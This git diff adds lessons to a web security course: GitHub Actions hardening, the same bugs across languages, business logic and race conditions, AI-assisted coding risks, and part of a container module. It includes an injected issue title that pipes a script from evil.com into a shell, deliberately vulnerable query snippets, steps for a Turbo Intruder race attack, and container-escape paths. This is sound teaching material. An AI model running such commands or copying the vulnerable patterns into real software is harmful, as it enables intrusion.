@@ -2202,6 +2202,159 @@ npm audit fix --dry-run # shows what bumping would change WITHOUT applying it
 ➡️ **Next step:** You can read HTTP, reason about DNS/TLS, investigate from the CLI, and keep secrets out of Git. Now turn your frontend fluency into security intuition — starting with the browser's trust model. Continue to **Phase 2: Secure JavaScript and Browser Security**.`,
     tracker: ["git init'd cli-lab with .gitignore before first commit; confirmed .env not staged", "Ran gitleaks and saw it flag the hard-coded key inside tracked code", "Ran npm audit on an old lodash and read the CVE output", "Can explain why a committed secret must be rotated even after deletion", "Answered the knowledge check"]
   },
+  {
+    id: "m1-5",
+    phaseId: "p1",
+    num: "1.5",
+    title: "Advanced GitHub Security — Actions, Signing, and SLSA",
+    objective: "GitHub Actions is simultaneously your most powerful CI/CD platform and its largest shared-infrastructure attack surface. Workflow injection, poisoned Actions, and static long-lived cloud credentials caused several of the highest-profile supply-chain compromises of the past five years — and they all happened in the pipeline, not the application. This module hardens your build so you ship the feature, not a backdoor.",
+    body: `> **Why this goes beyond module 1.4.** Basics — keeping secrets out of commits, running npm audit — are table stakes. The 2020 SolarWinds build-server compromise, the 2021 Codecov bash-uploader breach, the 2023 reviewdog/tj-actions poisoning, and dozens of copycat attacks all exploited CI/CD. The application code was fine; the build pipeline was the door.
+
+### 🎯 The four GitHub Actions attack vectors
+
+| Vector | Example | How it bites you |
+|--------|---------|-----------------|
+| **Workflow injection** | \`run: echo "\${{ github.event.issue.title }}"\` | Attacker opens an issue titled \`x\$(curl evil.com|sh)\`; your runner executes it |
+| **Poisoned Action** | \`uses: popular-action@v3\` (tag, not SHA) | Maintainer account compromised; new v3 tag ships malware to every repo using it |
+| **Excessive permissions** | \`permissions: write-all\` (GitHub's old default) | Stolen GITHUB_TOKEN can write any branch, publish packages, create releases |
+| **OIDC misconfig** | \`sub\` claim not validated in IAM trust policy | Any repo in the org can mint cloud credentials for your AWS/GCP/Azure account |
+
+### ⚔️ Attack demo: workflow injection
+
+A workflow that echoes untrusted input directly into a shell is the CI equivalent of unsanitised SQL. The **env-var pattern** is the fix — the value is passed as a process environment variable, not expanded inline before the shell sees it:
+
+\`\`\`yaml
+# ❌ VULNERABLE — expression is expanded before the shell sees it
+- name: Print title
+  run: echo "Title: \${{ github.event.issue.title }}"
+
+# ✅ SAFE — value is an env var; the shell never parses the expansion
+- name: Print title
+  run: echo "Title: $ISSUE_TITLE"
+  env:
+    ISSUE_TITLE: \${{ github.event.issue.title }}
+\`\`\`
+
+The **trigger** also matters. \`pull_request\` from a fork runs with *no write access and no secrets* by design. \`pull_request_target\` runs in the base-repo context (write permissions, secrets available) even when triggered by a fork PR — never check out and execute untrusted fork code inside a \`pull_request_target\` workflow.
+
+### 🛡️ Defense: the Actions hardening checklist
+
+**1. Pin every Action to a full commit SHA — never a mutable tag**
+
+\`\`\`yaml
+# ❌ tag is mutable — someone moves it after you audited it
+uses: actions/checkout@v4
+
+# ✅ SHA is immutable — cryptographically identifies one commit forever
+uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
+\`\`\`
+
+Use [pin-github-action](https://github.com/mheap/pin-github-action) or \`dependabot\` target mode to automate SHA pinning without manual lookups.
+
+**2. Declare minimal permissions per workflow**
+
+\`\`\`yaml
+permissions:
+  contents: read      # read source only
+  id-token: write     # only when you need OIDC cloud auth
+  # everything else is implicitly none
+\`\`\`
+
+**3. OIDC cloud auth — no static long-lived credentials**
+
+\`\`\`yaml
+# AWS example: role is assumed via short-lived OIDC token, no stored key
+- uses: aws-actions/configure-aws-credentials@v4
+  with:
+    role-to-assume: arn:aws:iam::123456789012:role/GitHubDeployRole
+    aws-region: us-east-1
+\`\`\`
+
+Lock the IAM trust policy to your specific repo and branch via the \`sub\` claim:
+\`\`\`json
+"Condition": {
+  "StringEquals": {
+    "token.actions.githubusercontent.com:sub":
+      "repo:your-org/your-repo:ref:refs/heads/main"
+  }
+}
+\`\`\`
+
+**4. Secret scanning + push protection**
+
+Enable in **Settings → Code security → Secret scanning → Push protection**. GitHub blocks pushes containing recognised secret patterns before the commit lands. Add \`gitleaks\` as a pre-commit hook locally too:
+
+\`\`\`bash
+# One-shot scan of the entire repo history
+gitleaks detect --source . --verbose
+\`\`\`
+
+**5. CODEOWNERS for security-sensitive paths**
+
+\`\`\`
+# .github/CODEOWNERS — changes to these paths require security-team review
+/.github/workflows/   @your-org/security-team
+/infra/               @your-org/security-team
+/auth/                @your-org/security-team
+\`\`\`
+
+**6. Signed commits with Gitsign (keyless / Sigstore)**
+
+\`\`\`bash
+# macOS
+brew install sigstore/tap/gitsign
+
+# Configure git globally
+git config --global commit.gpgsign true
+git config --global gpg.x509.program gitsign
+git config --global gpg.format x509
+\`\`\`
+
+Gitsign uses your OIDC identity (GitHub, Google, etc.) to sign commits and records them in Sigstore's public Rekor transparency ledger — no long-lived private GPG key to protect or rotate.
+
+### 🏗️ SLSA — Supply-chain Levels for Software Artifacts
+
+SLSA ("salsa") is a graduated framework for building trust in your build artifacts. SLSA 2 is the practical target for most teams:
+
+| SLSA Level | Minimum requirements |
+|-----------|---------------------|
+| 1 | Build scripted; provenance document available |
+| 2 | Hosted build service (GitHub Actions); signed provenance |
+| 3 | Hermetic builds; unforgeable provenance; no secrets in build env |
+| 4 | Two-party review for all changes; no single-actor bypass |
+
+\`npm provenance\` (npm 9.5+) reaches SLSA 2 automatically for published packages. The [slsa-github-generator](https://github.com/slsa-framework/slsa-github-generator) adds signed provenance to any binary or container image in one workflow step.
+
+### GitHub Advanced Security quick-start
+
+If your repo is public (or your org has GHAS):
+
+- **CodeQL** — add \`.github/workflows/codeql.yml\` for SAST on every PR (no configuration needed for JS, Python, Go, Java, C#, Ruby)
+- **Dependabot security updates** — auto-PRs the moment a CVE is published for a dependency you use
+- **Dependency review action** — blocks PRs that introduce new HIGH/CRITICAL vulns before merge
+- **Secret scanning** — alerts on secrets committed to any branch, plus push protection
+
+➡️ **Next step:** Your pipeline is locked down. Now build security into the user's browser — starting with the same-origin policy, the foundation all browser security is built on. Continue to **Phase 2: Secure JavaScript and Browser Security**.`,
+    tracker: [
+      "Can explain workflow injection and demonstrate the env-var fix pattern in YAML",
+      "Has pinned at least one Action to a full SHA hash in a real or practice workflow",
+      "Has added per-workflow minimal permissions: { contents: read } to a workflow",
+      "Can explain why OIDC cloud auth is safer than storing static cloud keys as GitHub Secrets",
+      "Has enabled secret scanning + push protection on a repository (or personal fork)",
+      "Understands SLSA levels 1–3 and can explain what signed provenance means",
+      "Answered the knowledge check"
+    ],
+    knowledgeCheck: [
+      {
+        q: "Why is `uses: actions/checkout@v4` less secure than pinning to a full commit SHA?",
+        a: "Tags are mutable — a maintainer (or an attacker who compromises the maintainer's account) can push a new commit to the v4 tag after you audited it, so your next CI run silently executes new code. A full commit SHA is immutable: it cryptographically identifies exactly one commit and can never be moved."
+      },
+      {
+        q: "What is the security difference between `pull_request` and `pull_request_target` triggers?",
+        a: "`pull_request` from a fork runs in a restricted sandbox: no write permissions, no access to secrets. `pull_request_target` always runs in the context of the *base* repository (with write permissions and secrets) even when triggered by a fork PR. Checking out and running untrusted fork code inside a `pull_request_target` workflow is effectively remote code execution with full repository write access."
+      }
+    ]
+  },
   // ============== PHASE 2 ==============
   {
     id: "m2-1",
@@ -3709,6 +3862,328 @@ Run the same forged-\`image/png\` upload against \`/upload-vulnerable\` and it's
 
 ➡️ **Next step:** You can harden a server, kill injection, lock down APIs and uploads. Now zoom out to the industry-standard map of *all* the major risks and practice them hands-on. Continue to **Phase 4: OWASP Top 10 and Web Exploitation Labs**.`,
     tracker: ["Built upload-lab.js and bypassed its naive mimetype check with a forged image/png", "Fixed it with magic-byte sniffing, an allow-list, a size cap, and a random filename", "Read the Flask + python-magic dual-language version (plus the Django note)", "Can explain how an upload becomes remote code execution", "Can explain why an SVG is a stored-XSS risk and how to serve files safely", "Can recite the default safe upload architecture", "Answered the knowledge check"]
+  },
+  {
+    id: "m3_5",
+    phaseId: "p3",
+    num: "3.5",
+    title: "Polyglot Security — Same Vulns, Every Language",
+    objective: "XSS, SQLi, path traversal, and insecure deserialization appear in Python, Go, Java, PHP, and Ruby just as they do in JavaScript — the syntax changes, the root causes don't. This module maps the security patterns you have built to the other frameworks you will encounter, and gives you the SCA/SAST tool per ecosystem so you can enforce them in CI regardless of language.",
+    body: `> **Why this module exists.** The course examples use Node/Express because it is the most common full-stack language — but the threat model is language-agnostic. A Django app can have SQLi; a Go service can have SSRF; a Rails app can have mass assignment. If you ever read, review, or inherit code in another language you need to know where to look and which tool to run.
+
+### 🎯 The universal root causes
+
+Every vulnerability category in this course maps to one of three root causes:
+
+1. **Injection** — untrusted data is interpreted as code or a command (SQL, HTML, shell, LDAP, XPath, template syntax)
+2. **Broken trust boundary** — the app grants a caller more authority than it verified
+3. **Insecure state** — a secret, session, or cryptographic value is stored, transmitted, or generated incorrectly
+
+The language changes the syntax. The root cause and the fix are the same.
+
+---
+
+### Python (Django / Flask)
+
+**SQLi**
+\`\`\`python
+# ❌ f-string or % interpolation in raw SQL
+cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
+
+# ✅ Django ORM (parameterised automatically)
+User.objects.filter(id=user_id)
+
+# ✅ Raw SQL when you need it — always parameterise
+cursor.execute("SELECT * FROM users WHERE id = %s", [user_id])
+\`\`\`
+
+**XSS** — Jinja2 auto-escapes by default in Flask templates. Never use \`| safe\` on user-controlled data. Django templates do the same.
+
+**Security SCA/SAST tools**
+\`\`\`bash
+pip install pip-audit bandit safety
+
+pip-audit                        # CVE scan of installed packages
+bandit -r . -ll                  # SAST: finds hardcoded secrets, shell injection, assert use
+safety scan                      # alternative CVE feed (pypi)
+\`\`\`
+
+---
+
+### Go
+
+**SQLi**
+\`\`\`go
+// ❌ string concatenation
+rows, _ := db.Query("SELECT * FROM users WHERE id = " + id)
+
+// ✅ parameterised query (database/sql)
+rows, _ := db.Query("SELECT * FROM users WHERE id = ?", id)
+\`\`\`
+
+**XSS** — \`html/template\` context-escapes all values automatically. \`text/template\` does NOT escape — never use it to generate HTML.
+
+**SSRF** — \`http.Get(url)\` without egress filtering is SSRF. Validate and allowlist URL schemes and hosts before fetching.
+
+**Security SCA/SAST tools**
+\`\`\`bash
+go install golang.org/x/vuln/cmd/govulncheck@latest
+govulncheck ./...          # scans your module graph against Go vuln DB
+
+# semgrep with Go rules
+semgrep --config=p/golang ./
+\`\`\`
+
+---
+
+### Java (Spring Boot)
+
+**SQLi**
+\`\`\`java
+// ❌ string concatenation
+String q = "SELECT * FROM users WHERE id = " + id;
+stmt.execute(q);
+
+// ✅ PreparedStatement
+PreparedStatement ps = conn.prepareStatement(
+    "SELECT * FROM users WHERE id = ?");
+ps.setString(1, id);
+
+// ✅ Spring Data JPA / @Query with :param binding
+@Query("SELECT u FROM User u WHERE u.id = :id")
+Optional<User> findById(@Param("id") String id);
+\`\`\`
+
+**XSS output** — use the [OWASP Java Encoder](https://owasp.org/www-project-java-encoder/) for any value written into HTML outside a template engine: \`Encode.forHtml(userInput)\`.
+
+**Security SCA/SAST tools**
+\`\`\`bash
+# OWASP Dependency-Check (Maven plugin or standalone)
+mvn org.owasp:dependency-check-maven:check
+
+# Semgrep for Java
+semgrep --config=p/java .
+\`\`\`
+
+---
+
+### PHP
+
+**SQLi**
+\`\`\`php
+// ❌ direct interpolation
+$result = $pdo->query("SELECT * FROM users WHERE id = $id");
+
+// ✅ PDO prepared statement
+$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
+$stmt->execute([$id]);
+\`\`\`
+
+**XSS** — always \`htmlspecialchars($output, ENT_QUOTES, 'UTF-8')\` before echoing user data into HTML. Never echo raw \`$_GET\`/\`$_POST\`/\`$_REQUEST\` into a page.
+
+**Security tools**
+\`\`\`bash
+composer audit          # scans composer.lock for CVEs (built in since Composer 2.4)
+\`\`\`
+
+---
+
+### Ruby on Rails
+
+Rails bakes in most defenses by default — but they are easy to opt out of accidentally:
+
+| Feature | Safe default | Common mistake that disables it |
+|---------|-------------|--------------------------------|
+| SQL | ActiveRecord parameterises | Passing a string to \`.where("id = #{params[:id]}")\` |
+| XSS | ERB auto-escapes | \`raw\`, \`html_safe\`, \`<%= ... %>.html_safe\` |
+| CSRF | \`protect_from_forgery\` | \`skip_before_action :verify_authenticity_token\` |
+| Mass assignment | Strong Parameters required | Using \`params.permit!\` or passing \`params\` directly |
+
+**Security tools**
+\`\`\`bash
+gem install bundler-audit
+bundle-audit check --update    # scans Gemfile.lock against ruby-advisory-db
+brakeman -A                    # Rails-specific SAST
+\`\`\`
+
+---
+
+### Polyglot SCA — generate an SBOM and scan it
+
+[Syft](https://github.com/anchore/syft) generates a Software Bill of Materials from any repo or container image; [Grype](https://github.com/anchore/grype) scans it for CVEs — both language-agnostic:
+
+\`\`\`bash
+# Install (macOS/Linux)
+brew install syft grype          # or: curl -sSfL ... | sh (see GitHub)
+
+# Generate SBOM for a Node project
+syft . -o json > sbom.json
+
+# Scan it — works for any ecosystem (npm, pip, go, maven, gem, cargo…)
+grype sbom:sbom.json
+
+# Scan a container image directly
+grype my-app:latest --fail-on high
+\`\`\`
+
+Add \`grype --fail-on critical\` to your CI pipeline to break the build on unpatched critical CVEs regardless of language.
+
+➡️ **Next step:** You know how the same vulnerabilities appear across every language. Now learn to find the ones scanners miss — the flaws in your *business logic*. Continue to **Module 3.6: Business Logic Flaws & Race Conditions**.`,
+    tracker: [
+      "Can write a parameterised SQL query in at least three languages (Node, Python, Go or Java, PHP or Ruby)",
+      "Can name the SAST/SCA tool for each major ecosystem: bandit/pip-audit, govulncheck, OWASP DC, brakeman/bundle-audit",
+      "Understands why Go's html/template is safer than text/template for HTML output",
+      "Has run Syft + Grype against a project and interpreted the output",
+      "Knows the common Rails 'opt-out' mistakes that disable built-in protections",
+      "Answered the knowledge check"
+    ],
+    knowledgeCheck: [
+      {
+        q: "A colleague says 'we're safe from XSS because we use Jinja2.' What should you verify?",
+        a: "Jinja2 auto-escapes by default in Flask when rendering .html templates — but auto-escaping is only on when the environment is configured with `autoescape=True` or you use `render_template` (which enables it for HTML files). Any use of `| safe` filter, `Markup()`, or `render_template_string` with unsanitised user data bypasses it. Verify that auto-escape is enabled and that no user-controlled values pass through `| safe`."
+      },
+      {
+        q: "You inherit a Rails app. A developer says they use `where(id: params[:id])` everywhere so they're safe from SQLi. Is that true, and what would you check next?",
+        a: "Hash-style `where(id: params[:id])` is parameterised and safe. But you should also grep for `where(\"id = #{params...}\")` (string interpolation bypasses the ORM), `.order(params[:sort])` (often unparameterised), and any use of `params.permit!` (mass assignment). Strong Parameters and auto-escaping in ERB are the other Rails defaults to verify are not accidentally disabled."
+      }
+    ]
+  },
+  {
+    id: "m3_6",
+    phaseId: "p3",
+    num: "3.6",
+    title: "Business Logic Flaws & Race Conditions",
+    objective: "SQL injection and XSS are what automated scanners find. Business logic flaws are what scanners systematically miss — they require understanding what the application is *supposed* to do before recognising when it doesn't. Race conditions are a critical subset: time-of-check to time-of-use bugs can let two concurrent requests both pass a check that should only pass once, allowing double-spend attacks, coupon reuse, and inventory corruption.",
+    body: `> **Why this matters.** Business logic flaws are responsible for some of the largest financial losses in web security history — not because they're sophisticated, but because they're invisible to the tools most teams use. A DAST scanner will never tell you that your referral bonus can be claimed twice, that a negative quantity in an order form nets a refund, or that two simultaneous API calls can both withdraw the last $1 from an account.
+
+### 🎯 What makes business logic flaws different
+
+A classic injection vulnerability breaks the *interpreter's* rules: the parser processes malicious input as code. A business logic flaw breaks the *application's* rules: the system does exactly what the code says, but the code doesn't implement the intended business constraint.
+
+**Common patterns:**
+
+| Flaw type | Example |
+|-----------|---------|
+| **Price / quantity manipulation** | Set \`price=0.01\` or \`quantity=-1\` in a cart request; server trusts the client value |
+| **Workflow skipping** | Skip step 2 of a checkout and hit the /confirm endpoint directly |
+| **Coupon / referral reuse** | Apply the same one-use promo code multiple times (race condition) |
+| **Privilege escalation via parameter** | Change \`role=user\` to \`role=admin\` in a profile update request |
+| **Response manipulation** | Intercept a failed payment response and replay a success response |
+
+### 🔍 Lab: Price manipulation in OWASP Juice Shop
+
+> **Ethics & scope.** Juice Shop is a deliberately vulnerable app you run locally for practice. These techniques must only be used on systems you own or have written permission to test.
+
+\`\`\`bash
+# Start Juice Shop (Docker)
+docker run -p 3000:3000 bkimminich/juice-shop
+
+# Open Burp Suite → Proxy → Intercept ON
+# Add an item to the cart → observe the POST /api/BasketItems request
+# Change "price" to 0.00 or quantity to -99 and forward
+\`\`\`
+
+Juice Shop's *Christmas Special* challenge, *Forged Coupon*, and *Payback* challenges all demonstrate this class of flaw.
+
+### ⏱️ Race conditions — the concurrent request attack
+
+A **race condition** exists when two operations interleave in a way the code doesn't expect. The classic web pattern is TOCTOU (Time Of Check To Time Of Use):
+
+\`\`\`
+Thread A: check(balance >= 100) → TRUE
+Thread B: check(balance >= 100) → TRUE    ← interleaves before A writes
+Thread A: balance -= 100   → balance = 0
+Thread B: balance -= 100   → balance = -100  ← double-spend
+\`\`\`
+
+**Demonstrating a race condition with Burp Suite Turbo Intruder:**
+
+Burp's *single-packet attack* sends up to ~20 HTTP/2 requests in a single TCP send, so they arrive at the server simultaneously:
+
+1. Capture a request that applies a one-use coupon
+2. Send to Turbo Intruder → select \`examples/race-single-packet-attack.py\`
+3. Set the number of concurrent requests to 15–20
+4. Send — if the server has no atomic check, multiple requests will succeed
+
+PortSwigger has a dedicated [Race Conditions lab track](https://portswigger.net/web-security/race-conditions) that walks through the single-packet attack technique step by step.
+
+### 🛡️ Defenses
+
+**1. Never trust client-supplied prices, totals, or roles**
+
+\`\`\`javascript
+// ❌ Trust the client's price
+const { productId, price } = req.body;
+await db.createOrder({ productId, price });
+
+// ✅ Look the price up server-side
+const product = await db.getProduct(productId);
+await db.createOrder({ productId, price: product.price });
+\`\`\`
+
+**2. Atomic database operations for concurrent checks**
+
+\`\`\`sql
+-- ❌ Read-then-write: a race between the check and the update is possible
+SELECT uses FROM coupons WHERE code = 'SAVE10' AND uses < 1;
+UPDATE coupons SET uses = uses + 1 WHERE code = 'SAVE10';
+
+-- ✅ Atomic conditional update: either row is updated or not — no race
+UPDATE coupons
+SET    uses = uses + 1
+WHERE  code = 'SAVE10' AND uses < 1;
+-- Check rows affected: if 0, the coupon was already used
+\`\`\`
+
+**3. Idempotency keys for financial operations**
+
+\`\`\`javascript
+// Client generates a unique key per operation
+const idempotencyKey = crypto.randomUUID();
+
+// Server stores and deduplicates on the key
+const existing = await db.query(
+  "SELECT result FROM payments WHERE idempotency_key = $1", [idempotencyKey]);
+if (existing) return existing.result;   // duplicate request — return cached result
+
+const result = await processPayment(amount);
+await db.query(
+  "INSERT INTO payments (idempotency_key, result) VALUES ($1, $2)",
+  [idempotencyKey, result]);
+return result;
+\`\`\`
+
+**4. Test business logic explicitly in code review**
+
+Write a checklist during design, not after: *Can a user skip this step? Can they supply this value themselves? What if two users do this simultaneously?* Business logic tests can't be automated — they require a human who understands the intended behavior.
+
+### 🔍 Testing methodology
+
+When testing any application for business logic flaws:
+- Map every workflow that changes state or grants value (checkout, redemption, withdrawal, role change)
+- For each workflow: identify every client-supplied value and try supplying unexpected values (negative, zero, very large, skipped steps)
+- For anything that should only happen once: test concurrent requests
+- Use Burp Repeater for single-request manipulation; Turbo Intruder for race conditions
+
+➡️ **Next step (Phase 3 complete):** You can harden a server against injection, lock down APIs and uploads, reason across multiple languages, and find the logic flaws scanners miss. Zoom out now to the industry-standard map of all major risks. Continue to **Phase 4: OWASP Top 10 and Web Exploitation Labs**.`,
+    tracker: [
+      "Can explain why business logic flaws don't appear in DAST/SAST output",
+      "Has completed at least one Juice Shop business logic challenge (e.g. price manipulation, coupon reuse)",
+      "Can demonstrate a race condition test using Burp Turbo Intruder (or single-packet attack concept)",
+      "Can implement the atomic conditional UPDATE pattern to prevent coupon double-use",
+      "Knows what an idempotency key is and why it prevents duplicate payment processing",
+      "Answered the knowledge check"
+    ],
+    knowledgeCheck: [
+      {
+        q: "A checkout endpoint accepts `{ productId, price }` from the client and creates the order with that price. What is the vulnerability and how do you fix it?",
+        a: "The server trusts a client-supplied price — an attacker can intercept the request and set price to 0.00 or any value. Fix: ignore the price field from the client entirely. Look up the authoritative price from the database using the productId, and use that server-side price to create the order."
+      },
+      {
+        q: "Two users simultaneously try to redeem a one-use promo code. The server does SELECT (check uses < 1) then UPDATE (increment uses). Why can both succeed, and what is the fix?",
+        a: "Because SELECT and UPDATE are separate operations. Between the check and the update, both threads can read uses=0, both pass the check, and both increment — leaving uses=2 even though it should cap at 1. Fix: use an atomic conditional UPDATE (`UPDATE coupons SET uses=uses+1 WHERE code=? AND uses<1`) and check rows-affected; if 0, the code was already used. Alternatively, SELECT FOR UPDATE within a transaction locks the row until the transaction commits, preventing the interleave."
+      }
+    ]
   },
   {
     id: "m4_1",
@@ -6667,6 +7142,136 @@ Within hours of Bing's public AI chat launch, users coaxed it into revealing its
     tracker: ["Can explain LLM cost-exhaustion as DoS with a financial loss attached", "Knows the defenses: per-user token budgets, hard max_tokens, runaway-agent loop/depth limits, authenticated billing, cost-as-security-signal", "Completed the Phase 7.5 cumulative quiz and read the Bing/Sydney 2023 case study", "Knows to assume the system prompt is public and never put secrets in it"]
   },
   {
+    id: "m7_5_6",
+    phaseId: "p7_5",
+    num: "7.5.6",
+    title: "Secure AI-Assisted Development — Copilot, ChatGPT, and Vibe Coding",
+    objective: "AI coding assistants generate working code at impressive speed — and introduce plausible-looking security vulnerabilities at the same speed. Copilot, ChatGPT, Cursor, and similar tools have no understanding of your threat model: they reproduce statistical patterns from their training data, which includes plenty of insecure code. This module gives you the mindset and workflow to use AI assistance without inheriting its blind spots.",
+    body: `> **The core problem.** AI coding assistants optimise for code that compiles and looks right. They have no concept of your application's trust model, privilege levels, or business invariants. Studies consistently show that AI-generated code has comparable or higher rates of security vulnerabilities to human-written code — often more, because the code *looks* more authoritative and reviewers scrutinise it less.
+
+### 🎯 What AI assistants systematically miss
+
+| Category | Why AI misses it |
+|----------|-----------------|
+| **Business logic flaws** | Requires understanding intended behaviour — pure pattern matching can't derive it |
+| **Authorization checks** | AI writes the happy path; "and verify the caller is authorised" is often omitted |
+| **Race conditions** | Require reasoning about concurrency — single-threaded code patterns don't hint at it |
+| **Cryptographic misuse** | AI reproduces common (often outdated) patterns: MD5/SHA1 for passwords, ECB mode, fixed IVs |
+| **Secrets in context** | If you paste code with keys into the prompt, the AI may echo them back into generated code |
+| **Input validation at boundaries** | AI validates in the obvious place, not at every trust boundary |
+| **Injection in non-SQL contexts** | LDAP injection, XPath injection, template injection — rare in training data |
+
+### ⚠️ Data privacy: what you must never paste into an AI tool
+
+\`\`\`
+✗ Real API keys, tokens, or secrets — even "for a quick example"
+✗ Production database credentials or connection strings
+✗ PII (names, emails, card numbers, medical data) in any form
+✗ Proprietary business logic that must remain confidential
+✗ Customer data samples ("here is a row from our DB")
+\`\`\`
+
+Most commercial AI coding tools (GitHub Copilot, ChatGPT Plus, Claude) have settings for data retention and training opt-out — read them and configure them for your role. Many enterprise agreements prohibit submitting proprietary code to external AI services; know your employer's policy before pasting anything.
+
+### 🔍 Security review workflow for AI-generated code
+
+**Step 1: Run your SAST/SCA tools first**
+
+Before reading the code, run the automated layer. It catches the easy stuff and frees your review time for what scanners miss:
+\`\`\`bash
+# JavaScript/TypeScript
+npx semgrep --config=p/javascript .
+
+# Python
+bandit -r generated_module.py
+
+# Go
+govulncheck ./...
+\`\`\`
+
+**Step 2: Ask the AI to attack its own code**
+
+Follow every generation with a targeted security prompt. This sounds trivial but produces real findings:
+
+\`\`\`
+Prompt: "Review the code you just generated for: SQL injection,
+missing authorization checks, hardcoded secrets, insecure
+cryptography, and any place where user input is not validated.
+List each issue and suggest a fix."
+\`\`\`
+
+The AI will often find real problems it introduced — its self-review mode is better calibrated than its generation mode.
+
+**Step 3: Check the trust boundary manually**
+
+For every function that accepts external input, ask:
+- Is the caller's identity verified before this runs?
+- Is the caller's *authorisation* verified (not just authentication)?
+- If two callers race this function, can they both succeed when only one should?
+- Are all returned values safe to include in HTML/SQL/shell output, or does the caller assume they are?
+
+**Step 4: Prompt for security-aware code from the start**
+
+Adding security constraints to the initial prompt significantly reduces rework:
+
+\`\`\`
+Prompt: "Write a Node.js Express route to handle file uploads.
+Requirements:
+- Validate file type by magic bytes, not file extension
+- Reject files larger than 5MB
+- Store with a server-generated random filename (never use the original)
+- Return 400 with a safe error message if validation fails
+- The user must be authenticated (req.user populated by middleware)
+Do not trust any client-supplied values."
+\`\`\`
+
+### 🛡️ Vibe-coding security checklist
+
+When you have AI write a full feature:
+
+\`\`\`
+□ Run SAST before committing (semgrep, bandit, govulncheck per language)
+□ Review all authorization checks — are they present on every protected route?
+□ Verify parameterised queries — grep for string concatenation into SQL
+□ Check cryptography — grep for MD5, SHA1, Math.random, ECB, hardcoded IV/key
+□ Verify input validation is at the trust boundary, not just in the UI
+□ Confirm no secrets appear in the generated code
+□ Check error messages — do they leak stack traces or internal paths to the user?
+□ Look for missing rate limiting on any endpoint that does work (auth, send email, etc.)
+\`\`\`
+
+### MCP server security (emerging — 2024+)
+
+Model Context Protocol (MCP) servers extend AI assistants with tools that can read files, run commands, and call APIs. The security surface is significant:
+
+- **Tool call injection:** an indirect prompt injection in a document the LLM reads can trigger MCP tool calls the user never intended
+- **Over-broad tool permissions:** an MCP server with filesystem write access is a privilege escalation if the LLM is manipulated
+- **Unverified server identity:** MCP server manifests can claim any name/description — a malicious MCP can impersonate a legitimate one
+
+When evaluating MCP servers for your AI development environment: review all declared tools and their permission requirements, prefer servers with read-only or narrowly-scoped capabilities, and treat MCP servers from unknown authors as you would any third-party code dependency.
+
+➡️ **Next step (Phase 7.5 complete):** You can defend the LLM trust boundary and use AI tools without inheriting their security blind spots. Now ship everything safely — secrets management, production hardening, and cloud posture. Continue to **Phase 8: Cloud, Deployment, and Production Security**.`,
+    tracker: [
+      "Can name 5 categories of security issues AI assistants systematically miss",
+      "Knows what types of data must never be pasted into an AI coding tool",
+      "Has used the 'attack your own code' review prompt and found at least one issue",
+      "Can write an initial prompt that includes explicit security constraints",
+      "Has added SAST to a project workflow to catch AI-generated vulnerabilities",
+      "Understands the basic security risks of MCP servers in AI development environments",
+      "Answered the knowledge check"
+    ],
+    knowledgeCheck: [
+      {
+        q: "A colleague generates a full REST API with GitHub Copilot and says 'I tested it and all the endpoints work correctly.' What security concerns would you raise before merging?",
+        a: "Working correctly (returning the right data) and being secure are different things. You should check: are all protected routes guarded by an authentication and authorization middleware (Copilot often writes the happy path without auth)? Are all database queries parameterised (not string-concatenated)? Are there any hardcoded secrets or API keys in the generated code? Does any error handling leak stack traces to the caller? Is file handling or external URL fetching present (and if so, is it validated)? Run a SAST tool (semgrep, bandit, etc.) before the review to catch the automatable issues."
+      },
+      {
+        q: "Why is sharing real customer data with an AI assistant to 'get a quick example working' a problem even if the AI tool says it won't use it for training?",
+        a: "Multiple reasons: (1) 'not used for training' doesn't mean 'not stored' — retention policies vary and data could be exposed in a breach of the AI provider; (2) your employment contract or your company's data processing agreements may prohibit sending customer PII to third parties regardless of training; (3) GDPR / CCPA / HIPAA regulations may apply to the data and require data processing agreements you haven't established with the AI vendor; (4) even a brief transmission introduces a data-exfiltration risk outside your control. Use synthetic or anonymised data for AI-assisted development."
+      }
+    ]
+  },
+  {
     id: "m8_1",
     phaseId: "p8",
     num: "8.1",
@@ -7088,6 +7693,185 @@ In 2019 a former AWS engineer exfiltrated 100M+ Capital One credit card applicat
 
 ➡️ **Next step (Phase 8 complete):** You can ship safely. But prevention eventually fails — so the next phase builds the layer that *catches* failures: logging, monitoring, and incident response. Continue to **Phase 9: Logging, Monitoring, Incident Response for Web Apps**.`,
     tracker: ["Can explain 'identity is the perimeter' and least-privilege IAM as the thing that bounds blast radius", "Can walk the SSRF-to-metadata chain end to end and name its two independent defenses (IMDSv2 + egress filtering), plus how IAM breaks the final link", "Knows to filter SSRF by resolved IP (not hostname string) and why DNS rebinding defeats string checks", "Read the Capital One 2019 case study and can map each step to a defense"]
+  },
+  {
+    id: "m8_4",
+    phaseId: "p8",
+    num: "8.4",
+    title: "Container & Kubernetes Security",
+    objective: "\"It works in Docker\" ships the vulnerability alongside the feature. Container escape, poisoned base images, Kubernetes misconfiguration, and secrets in environment variables have become the dominant production attack surface for full-stack apps running on cloud infrastructure. This module gives you the hardening checklist for both the container and the orchestrator layer.",
+    body: `> **The core misconception.** Containers are a process isolation and packaging mechanism — they are *not* a security boundary equivalent to a VM. A container running as root with a vulnerable kernel, a mounted Docker socket, or overly-permissive capabilities can be escaped into the host. The security work is in what you *put in* the container and how you *configure* the cluster — not in the container technology itself.
+
+### 🎯 Container escape — why it happens
+
+The three common container-escape conditions:
+
+| Condition | Attack path |
+|-----------|------------|
+| **Running as root** | A process vuln inside the container → root on the container → kernel exploit or mounts → host |
+| **Mounted Docker socket** | \`-v /var/run/docker.sock:/var/run/docker.sock\` → create a privileged container → host escape |
+| **Privileged / SYS_ADMIN capability** | \`--privileged\` or \`--cap-add SYS_ADMIN\` → mount host filesystem → read host files, write cron jobs |
+
+**Lesson:** never mount the Docker socket into an application container, never run \`--privileged\`, and never run as root unless the application explicitly requires it (and most don't).
+
+### 🛡️ Dockerfile hardening checklist
+
+\`\`\`dockerfile
+# 1. Multi-stage build — only copy what the final image needs
+FROM node:22-slim AS build
+WORKDIR /app
+COPY package*.json ./
+RUN npm ci --only=production
+COPY . .
+RUN npm run build
+
+# 2. Minimal runtime base — distroless has no shell, no package manager
+FROM gcr.io/distroless/nodejs22-debian12 AS runtime
+WORKDIR /app
+COPY --from=build /app/dist ./dist
+COPY --from=build /app/node_modules ./node_modules
+
+# 3. Non-root USER — use a named user, not UID 0
